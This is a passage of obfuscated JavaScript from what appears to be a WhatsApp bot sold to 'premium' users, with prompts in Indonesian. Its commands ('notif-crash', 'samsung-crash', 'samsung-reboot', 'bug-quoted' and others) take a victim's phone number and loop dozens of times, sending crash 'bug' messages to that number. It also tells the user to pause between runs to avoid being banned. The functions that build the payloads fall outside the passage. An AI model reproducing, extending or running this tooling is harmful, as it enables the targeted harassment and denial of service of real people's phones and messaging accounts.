            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x697d7a = q.replace(/[^0-9]/g, '');
          if (_0x697d7a.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1756af = _0x697d7a + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x5dc804 = 0x0; _0x5dc804 < 0x1e; _0x5dc804++) {
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x28a511(_0x1756af);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x28a511(_0x1756af);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x28a511(_0x1756af);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4de787(_0x1756af, _0x600e6e);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4de787(_0x1756af, _0x600e6e);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4b4561(_0x1756af, _0x600e6e);
            await _0x156efb(_0x1756af, _0x3facec);
            await _0x4de787(_0x1756af, _0x600e6e);
            await _0x4b4561(_0x1756af, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x697d7a + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "luchifer":
      case "notif-crash":
      case "crash-total":
      case '🔥':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x22c4a5 = q.replace(/[^0-9]/g, '');
          if (_0x22c4a5.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1a24bf = _0x22c4a5 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x28598d = 0x0; _0x28598d < 0x1e; _0x28598d++) {
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
            await _0x4b4561(_0x1a24bf, _0x600e6e);
            await _0x4de787(_0x1a24bf, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x22c4a5 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'chace-bug':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5a8d6c = q.replace(/[^0-9]/g, '');
          if (_0x5a8d6c.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x51c32d = _0x5a8d6c + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x608c88 = 0x0; _0x608c88 < 0x32; _0x608c88++) {
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
            await _0x4b4561(_0x51c32d, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x5a8d6c + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'samsung-ui':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x58fd51 = q.replace(/[^0-9]/g, '');
          if (_0x58fd51.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x2c55ee = _0x58fd51 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x246c32 = 0x0; _0x246c32 < 0x32; _0x246c32++) {
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
            await _0x4b4561(_0x2c55ee, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x58fd51 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "vivo-samsung":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x269c11 = q.replace(/[^0-9]/g, '');
          if (_0x269c11.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x4cb59b = _0x269c11 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x4590d2 = 0x0; _0x4590d2 < 0x32; _0x4590d2++) {
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
            await _0x4b4561(_0x4cb59b, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x269c11 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "samsung-internal":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x205b36 = q.replace(/[^0-9]/g, '');
          if (_0x205b36.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0xfce12e = _0x205b36 + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x4128b0 = 0x0; _0x4128b0 < 0x32; _0x4128b0++) {
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
            await _0x4b4561(_0xfce12e, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x205b36 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'samsung-external':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5df6be = q.replace(/[^0-9]/g, '');
          if (_0x5df6be.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5b3d0d = _0x5df6be + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0xef9de8 = 0x0; _0xef9de8 < 0x32; _0xef9de8++) {
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
            await _0x4b4561(_0x5b3d0d, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x5df6be + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'samsung-crash':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x8c4d76 = q.replace(/[^0-9]/g, '');
          if (_0x8c4d76.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x51feb3 = _0x8c4d76 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x22ff5 = 0x0; _0x22ff5 < 0x32; _0x22ff5++) {
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
            await _0x4b4561(_0x51feb3, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x8c4d76 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "samsung-reboot":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0xbe73d1 = q.replace(/[^0-9]/g, '');
          if (_0xbe73d1.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5227fb = _0xbe73d1 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x44a8cd = 0x0; _0x44a8cd < 0x32; _0x44a8cd++) {
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
            await _0x4b4561(_0x5227fb, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0xbe73d1 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'samsung-bug':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x2abd20 = q.replace(/[^0-9]/g, '');
          if (_0x2abd20.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x48e476 = _0x2abd20 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x16ae71 = 0x0; _0x16ae71 < 0x32; _0x16ae71++) {
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
            await _0x4b4561(_0x48e476, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x2abd20 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "bug-quoted":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
